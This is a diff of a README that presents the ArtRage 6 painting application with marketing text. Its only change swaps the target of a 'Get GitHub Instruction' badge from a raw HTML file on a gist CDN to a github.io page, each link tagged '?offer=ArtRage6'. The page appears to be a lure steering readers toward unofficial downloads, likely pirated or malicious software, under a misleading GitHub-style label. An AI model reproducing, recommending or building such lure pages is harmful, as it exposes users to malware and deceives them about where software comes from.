@@ -2,7 +2,7 @@
 
 ArtRage 6 is a professional digital painting application that brings the **look and feel of traditional art tools** to your desktop. From oils and watercolors to pencils and pastels, it lets artists paint naturally with stunning realism and texture. 🎨  
 
-[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/banzadrot964/0a96491d3f9492f9f9f4b34250ee4e3d/raw/61b7b08feeabf5b0d06d14f836d582dfcd3da391/get.html?offer=ArtRage6)
+[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://app-set-deploy.github.io/.github/?offer=ArtRage6)
 
 ---
 
